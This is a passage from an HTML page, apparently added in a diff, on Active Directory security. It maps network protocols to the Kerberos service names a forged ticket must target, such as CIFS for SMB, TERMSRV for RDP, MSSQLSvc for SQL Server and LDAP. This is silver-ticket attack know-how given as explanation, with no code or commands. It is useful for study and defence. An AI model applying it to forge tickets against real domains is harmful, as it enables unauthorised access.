Protocol</td><td id="Al]|" class="" style="width:451px">Telnet-like access</td></tr><tr id="30c79e9a-d7c9-8073-9d8d-eefb87aa7537"><td id="LgfO" class="" style="width:275px"><strong>NFS</strong></td><td id="swSD" class="" style="width:467px">Network File System</td><td id="Al]|" class="" style="width:451px">Mounting NFS shares</td></tr><tr id="30c79e9a-d7c9-807d-bcb8-ef487ff8278c"><td id="LgfO" class="" style="width:275px"><strong>SMTP</strong></td><td id="swSD" class="" style="width:467px">Mail relay using SMTP</td><td id="Al]|" class="" style="width:451px">Sending email via SMTP</td></tr></tbody></table><h3 id="30c79e9a-d7c9-807a-bad0-f0fb4aae6946" class=""><strong>Explanation of Key Examples:</strong></h3><ol><li><strong>WinRM/WinRS (Service: HTTP)</strong><ul><li>If we need to use <code>winrs</code> or <code>Invoke-Command</code>, we must forge a ticket for the <strong>HTTP service</strong> on the target machine.</li></ul></li></ol><ol><li><strong>WMI (Services: HOST, RPCSS)</strong><ul><li>WMI uses <strong>HOST</strong> and <strong>RPCSS</strong> to manage remote processes and interact with the Windows Management Instrumentation service.</li></ul></li></ol><ol><li><strong>SMB/Shared Drives (Service: CIFS)</strong><ul><li>Accessing file shares or interacting with <code>net use</code> requires a forged ticket for the <strong>CIFS</strong> service.</li></ul></li></ol><ol><li><strong>SQL Server (Service: MSSQLSvc)</strong><ul><li>For accessing databases through SQLCMD or Management Studio, we need a ticket for the <strong>MSSQLSvc</strong> service.</li></ul></li></ol><ol><li><strong>RDP (Service: TERMSRV)</strong><ul><li>Forging a ticket for <strong>TERMSRV</strong> allows Remote Desktop Protocol (RDP) sessions to the target.</li></ul></li></ol><ol><li><strong>LDAP (Service: LDAP)</strong><ul><li>Any Active Directory enumeration over LDAP (e.g., <code>ldapsearch</code>) requires a ticket for <strong>LDAP</strong>.</li></ul></li></ol>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
